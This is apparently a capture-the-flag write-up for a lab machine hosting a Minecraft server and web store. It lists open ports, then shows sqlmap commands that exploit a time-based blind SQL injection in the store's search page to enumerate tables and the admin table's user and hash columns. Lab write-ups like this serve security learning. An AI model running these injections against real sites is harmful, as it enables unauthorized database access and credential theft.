Nov 22, 2021 • ybenel

A Medium Linux Machine That Consist Of Exploiting A Minecraft Server.

User Enumeration

Open Ports

  • 22 ’ssh’ (Ubuntu) , 80 “Apache Httpd 2.4.49” , 25565 “Minecraft Server” ( Full Port Scan )

Vulnerabilities And Exploitation

Time-Based Blind Sql Injection In http://store.cybercrafted.thm/search.php search=<Payload>&submit Using Sqlmap to automate exploitation of our sql injecetion .

  • Tables (Database: Webapp)

    sqlmap -u http://store.cybercrafted.thm/search.php --data "search=*&submit=" --tables
    admin
    stock

  • Columns (Table Admin)

    sqlmap -u http://store.cybercrafted.thm/search.php --data "search=*&submit=" --tamper=space2comment -D webapp -T admin --columns --threads=10
    Columns Type
    user varchar(32)
    hash varchar(64)
    id int(10) unsigned
